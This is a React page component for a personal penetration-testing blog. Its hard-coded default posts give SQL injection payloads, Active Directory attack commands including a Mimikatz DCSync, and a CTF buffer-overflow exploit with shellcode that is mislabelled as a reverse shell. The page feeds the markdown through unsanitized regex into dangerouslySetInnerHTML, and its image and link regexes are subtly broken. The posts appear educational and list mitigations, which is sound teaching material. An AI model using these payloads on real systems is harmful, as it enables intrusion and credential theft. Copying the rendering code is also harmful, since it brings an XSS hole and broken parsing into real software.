"use client"

import { useEffect, useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Shield, ArrowLeft, Calendar, Eye, Share2, Twitter, Linkedin, Facebook } from "lucide-react"
import Link from "next/link"
import { useParams } from "next/navigation"

interface BlogPost {
  id: number
  title: string
  category: string
  status: string
  date: string
  views: string
  content: string
  featuredImage?: string
  slug: string
}

// Simple markdown to HTML converter
const markdownToHtml = (markdown: string): string => {
  const html = markdown
    // Images
    .replace(
      /!\[([^\]]*)\]$$([^)]+)$$/g,
      '<img src="$2" alt="$1" class="w-full max-w-2xl mx-auto rounded-lg border border-slate-600 my-6" />',
    )
    // Headers
    .replace(/^### (.*$)/gim, '<h3 class="text-xl font-semibold text-white mb-4 mt-8">$1</h3>')
    .replace(/^## (.*$)/gim, '<h2 class="text-2xl font-bold text-white mb-6 mt-10">$1</h2>')
    .replace(/^# (.*$)/gim, '<h1 class="text-3xl font-bold text-white mb-8 mt-12">$1</h1>')
    // Bold and italic
    .replace(/\*\*(.*?)\*\*/g, '<strong class="font-bold text-white">$1</strong>')
    .replace(/\*(.*?)\*/g, '<em class="italic text-slate-300">$1</em>')
    // Code blocks
    .replace(
      /```(\w+)?\n([\s\S]*?)```/g,
      '<pre class="bg-slate-800 p-6 rounded-lg border border-slate-600 my-6 overflow-x-auto"><code class="text-green-400 text-sm font-mono">$2</code></pre>',
    )
    // Inline code
    .replace(/`(.*?)`/g, '<code class="bg-slate-700 px-2 py-1 rounded text-red-400 text-sm font-mono">$1</code>')
    // Links
    .replace(
      /\[([^\]]+)\]$$([^)]+)$$/g,
      '<a href="$2" class="text-red-400 hover:text-red-300 underline" target="_blank">$1</a>',
    )
    // Lists
    .replace(/^- (.*$)/gim, '<li class="text-slate-300 mb-2 ml-4">• $1</li>')
    // Paragraphs
    .replace(/\n\n/g, '</p><p class="text-slate-300 mb-4 leading-relaxed">')
    .replace(/\n/g, "<br>")

  return `<div class="prose prose-invert max-w-none"><p class="text-slate-300 mb-4 leading-relaxed">${html}</p></div>`
}

export default function BlogPostPage() {
  const [post, setPost] = useState<BlogPost | null>(null)
  const [relatedPosts, setRelatedPosts] = useState<BlogPost[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const params = useParams()
  const slug = params.slug as string

  useEffect(() => {
    // Load posts from localStorage
    const savedPosts = localStorage.getItem("blogPosts")
    let allPosts: BlogPost[] = []

    if (savedPosts) {
      allPosts = JSON.parse(savedPosts).filter((p: BlogPost) => p.status === "published")
    } else {
      // Default posts if none saved
      allPosts = [
        {
          id: 1,
          title: "Advanced SQL Injection Techniques in Modern Web Applications",
          category: "Web Security",
          status: "published",
          date: "Dec 15, 2024",
          views: "1.2k",
          content: `# Advanced SQL Injection Techniques in Modern Web Applications

## Introduction

SQL injection remains one of the most critical vulnerabilities in web applications. This comprehensive guide explores advanced techniques used in modern penetration testing scenarios.

## Key Techniques

### 1. Union-Based Injection

\`\`\`sql
' UNION SELECT 1,2,3,database(),5-- -
\`\`\`

### 2. Boolean-Based Blind Injection

\`\`\`sql
' AND (SELECT SUBSTRING(@@version,1,1))='5'-- -
\`\`\`

### 3. Time-Based Blind Injection

\`\`\`sql
'; WAITFOR DELAY '00:00:05'-- -
\`\`\`

## Tools and Methodology

- **Burp Suite**: For intercepting and modifying requests
- **SQLMap**: Automated SQL injection detection and exploitation
- **Custom Scripts**: Python-based payload generation

## Real-World Examples

During a recent penetration test, I discovered a second-order SQL injection vulnerability in a financial application. The vulnerability existed in the user profile update functionality where user input was stored and later used in an unsafe SQL query.

## Mitigation Strategies

1. **Parameterized Queries**: Always use prepared statements
2. **Input Validation**: Implement strict input validation
3. **Least Privilege**: Database users should have minimal permissions
4. **WAF Implementation**: Deploy Web Application Firewalls

## Conclusion

Understanding these advanced SQL injection techniques is crucial for both offensive and defensive security professionals. Regular security assessments and code reviews can help identify and remediate these vulnerabilities before they can be exploited.

---

*Published by Ye Yint Thu | OSI Team Member*`,
          featuredImage: "/placeholder.svg?height=300&width=400",
          slug: "advanced-sql-injection-techniques-in-modern-web-applications",
        },
        {
          id: 2,
          title: "Active Directory Privilege Escalation: From User to Domain Admin",
          category: "Network Security",
          status: "published",
          date: "Dec 10, 2024",
          views: "890",
          content: `# Active Directory Privilege Escalation: From User to Domain Admin

## Overview

Active Directory environments are complex ecosystems that often contain misconfigurations leading to privilege escalation opportunities. This guide covers common techniques used during red team engagements.

## Common Attack Vectors

### 1. Kerberoasting

\`\`\`powershell
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat
\`\`\`

### 2. ASREPRoasting

\`\`\`powershell
Get-DomainUser -PreauthNotRequired | Get-DomainSPNTicket -Format Hashcat
\`\`\`

### 3. DCSync Attack

\`\`\`powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /user:Administrator"'
\`\`\`

## Tools and Techniques

- **BloodHound**: For AD enumeration and attack path analysis
- **PowerView**: PowerShell-based AD reconnaissance
- **Mimikatz**: Credential extraction and manipulation
- **Rubeus**: Kerberos interaction toolkit

## Case Study

During a recent engagement, I identified a service account with unconstrained delegation privileges. This misconfiguration allowed for a complete domain compromise through a series of carefully crafted attacks.

## Defense Strategies

1. **Regular Audits**: Implement continuous AD security assessments
2. **Least Privilege**: Follow principle of least privilege
3. **Monitoring**: Deploy advanced threat detection
4. **Hardening**: Implement AD security baselines

---

*Published by Ye Yint Thu | OSI Team Member*`,
          featuredImage: "/placeholder.svg?height=300&width=400",
          slug: "active-directory-privilege-escalation-from-user-to-domain-admin",
        },
        {
          id: 3,
          title: "HTB Machine Writeup: Exploiting Custom Binary with Buffer Overflow",
          category: "CTF Writeup",
          status: "published",
          date: "Nov 28, 2024",
          views: "654",
          content: `# HTB Machine Writeup: Exploiting Custom Binary with Buffer Overflow

## Machine Information

- **Name**: CustomBinary
- **Difficulty**: Medium
- **OS**: Linux
- **Points**: 30

## Reconnaissance

Starting with an nmap scan to identify open services:

\`\`\`bash
nmap -sC -sV -oA nmap/custombinary 10.10.10.xxx
\`\`\`

## Initial Access

The target machine was running a custom binary service on port 9999. Initial analysis revealed a buffer overflow vulnerability in the input handling function.

### Vulnerability Analysis

\`\`\`python
#!/usr/bin/env python3
import socket

# Create overflow payload
buffer = "A" * 1024
payload = buffer

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.xxx", 9999))
s.send(payload.encode())
s.close()
\`\`\`

### Exploitation

After identifying the exact offset and developing a working exploit:

\`\`\`python
#!/usr/bin/env python3
import socket
import struct

# Shellcode for reverse shell
shellcode = (
    "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

# Build exploit
offset = 512
ret_addr = struct.pack("<I", 0xbffff7a0)
payload = "A" * offset + ret_addr + "\\x90" * 16 + shellcode

# Send exploit
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.xxx", 9999))
s.send(payload.encode())
s.close()
\`\`\`

## Privilege Escalation

Once on the system, enumeration revealed a SUID binary with a path traversal vulnerability, leading to root access.

## Lessons Learned

1. Always check for custom services on unusual ports
2. Buffer overflow vulnerabilities still exist in modern applications
3. Proper input validation is crucial for application security

---

*Published by Ye Yint Thu | OSI Team Member*`,
          featuredImage: "/placeholder.svg?height=300&width=400",
          slug: "htb-machine-writeup-exploiting-custom-binary-with-buffer-overflow",
        },
      ]
    }

    // Find the current post
    const currentPost = allPosts.find((p) => p.slug === slug)
    setPost(currentPost || null)

    // Find related posts (same category, excluding current post)
    if (currentPost) {
      const related = allPosts.filter((p) => p.category === currentPost.category && p.id !== currentPost.id).slice(0, 3)
      setRelatedPosts(related)
    }

    setIsLoading(false)
  }, [slug])

  const getCategoryColor = (category: string) => {
    switch (category) {
      case "Web Security":
        return "bg-red-900/30 text-red-300 border-red-700"
      case "Network Security":
        return "bg-blue-900/30 text-blue-300 border-blue-700"
      case "CTF Writeup":
        return "bg-green-900/30 text-green-300 border-green-700"
      case "Cloud Security":
        return "bg-orange-900/30 text-orange-300 border-orange-700"
      case "Tools & Techniques":
        return "bg-purple-900/30 text-purple-300 border-purple-700"
      case "Research":
        return "bg-indigo-900/30 text-indigo-300 border-indigo-700"
      default:
        return "bg-gray-900/30 text-gray-300 border-gray-700"
    }
  }

  const shareUrl = typeof window !== "undefined" ? window.location.href : ""

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center">
        <div className="text-white">Loading...</div>
      </div>
    )
  }

  if (!post) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center">
        <div className="text-center">
          <h1 className="text-4xl font-bold text-white mb-4">Article Not Found</h1>
          <p className="text-slate-400 mb-8">The article you're looking for doesn't exist.</p>
          <Link href="/blog">
            <Button className="bg-red-600 hover:bg-red-700 text-white">
              <ArrowLeft className="mr-2 h-4 w-4" />
              Back to Blog
            </Button>
          </Link>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
      {/* Header */}
      <header className="border-b border-slate-700 bg-slate-900/50 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4">
          <nav className="flex items-center justify-between">
            <div className="flex items-center space-x-2">
              <Shield className="h-8 w-8 text-red-500" />
              <span className="text-xl font-bold text-white">Ye Yint Thu</span>
            </div>
            <div className="hidden md:flex space-x-6">
              <Link href="/" className="text-slate-300 hover:text-white transition-colors">
                Home
              </Link>
              <Link href="/#about" className="text-slate-300 hover:text-white transition-colors">
                About
              </Link>
              <Link href="/#services" className="text-slate-300 hover:text-white transition-colors">
                Services
              </Link>
              <Link href="/blog" className="text-red-400 font-medium">
                Blog
              </Link>
              <Link href="/#contact" className="text-slate-300 hover:text-white transition-colors">
                Contact
              </Link>
            </div>
          </nav>
        </div>
      </header>

      {/* Article Content */}
      <article className="py-12 px-4">
        <div className="container mx-auto">
          <div className="max-w-4xl mx-auto">
            {/* Back Button */}
            <Link
              href="/blog"
              className="inline-flex items-center text-slate-400 hover:text-white transition-colors mb-8"
            >
              <ArrowLeft className="mr-2 h-4 w-4" />
              Back to Blog
            </Link>

            {/* Article Header */}
            <div className="mb-8">
              <div className="flex items-center space-x-4 mb-4">
                <Badge variant="secondary" className={getCategoryColor(post.category)}>
                  {post.category}
                </Badge>
                <div className="flex items-center text-slate-400 text-sm space-x-4">
                  <div className="flex items-center">
                    <Calendar className="mr-1 h-4 w-4" />
                    {post.date}
                  </div>
                  <div className="flex items-center">
                    <Eye className="mr-1 h-4 w-4" />
                    {post.views} views
                  </div>
                </div>
              </div>
              <h1 className="text-4xl md:text-5xl font-bold text-white mb-6 leading-tight">{post.title}</h1>
            </div>

            {/* Featured Image */}
            {post.featuredImage && (
              <div className="mb-8">
                <img
                  src={post.featuredImage || "/placeholder.svg"}
                  alt={post.title}
                  className="w-full h-64 md:h-96 object-cover rounded-lg border border-slate-700"
                />
              </div>
            )}

            {/* Article Content */}
            <Card className="bg-slate-800/30 border-slate-700 mb-8">
              <CardContent className="p-8">
                <div
                  className="prose prose-invert max-w-none"
                  dangerouslySetInnerHTML={{
                    __html: markdownToHtml(post.content),
                  }}
                />
              </CardContent>
            </Card>

            {/* Share Section */}
            <Card className="bg-slate-800/30 border-slate-700 mb-8">
              <CardContent className="p-6">
                <div className="flex items-center justify-between">
                  <div className="flex items-center space-x-2">
                    <Share2 className="h-5 w-5 text-slate-400" />
                    <span className="text-slate-300 font-medium">Share this article</span>
                  </div>
                  <div className="flex space-x-3">
                    <Button
                      size="sm"
                      variant="outline"
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                      onClick={() =>
                        window.open(
                          `https://twitter.com/intent/tweet?url=${encodeURIComponent(shareUrl)}&text=${encodeURIComponent(post.title)}`,
                          "_blank",
                        )
                      }
                    >
                      <Twitter className="h-4 w-4" />
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                      onClick={() =>
                        window.open(
                          `https://www.linkedin.com/sharing/share-offsite/?url=${encodeURIComponent(shareUrl)}`,
                          "_blank",
                        )
                      }
                    >
                      <Linkedin className="h-4 w-4" />
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      className="border-slate-600 text-slate-300 hover:bg-slate-700"
                      onClick={() =>
                        window.open(
                          `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(shareUrl)}`,
                          "_blank",
                        )
                      }
                    >
                      <Facebook className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Related Articles */}
            {relatedPosts.length > 0 && (
              <div>
                <h2 className="text-2xl font-bold text-white mb-6">Related Articles</h2>
                <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
                  {relatedPosts.map((relatedPost) => (
                    <Card
                      key={relatedPost.id}
                      className="bg-slate-800/50 border-slate-700 hover:bg-slate-800/70 transition-colors"
                    >
                      <div className="aspect-video overflow-hidden rounded-t-lg">
                        <img
                          src={relatedPost.featuredImage || "/placeholder.svg?height=200&width=350"}
                          alt="Related post"
                          className="w-full h-full object-cover hover:scale-105 transition-transform"
                        />
                      </div>
                      <CardContent className="p-4">
                        <Badge variant="secondary" className={`${getCategoryColor(relatedPost.category)} mb-2`}>
                          {relatedPost.category}
                        </Badge>
                        <h3 className="text-white font-semibold mb-2 hover:text-red-400 transition-colors">
                          <Link href={`/blog/${relatedPost.slug}`}>{relatedPost.title}</Link>
                        </h3>
                        <p className="text-slate-400 text-sm mb-3">{relatedPost.content.substring(0, 100)}...</p>
                        <Link
                          href={`/blog/${relatedPost.slug}`}
                          className="text-red-400 hover:text-red-300 text-sm font-medium"
                        >
                          Read More →
                        </Link>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      </article>

      {/* Footer */}
      <footer className="border-t border-slate-700 bg-slate-900/50 py-8 px-4 mt-20">
        <div className="container mx-auto text-center">
          <p className="text-slate-400">
            © {new Date().getFullYear()} Ye Yint Thu. All rights reserved. | Cybersecurity Blog
          </p>
        </div>
      </footer>
    </div>
  )
}
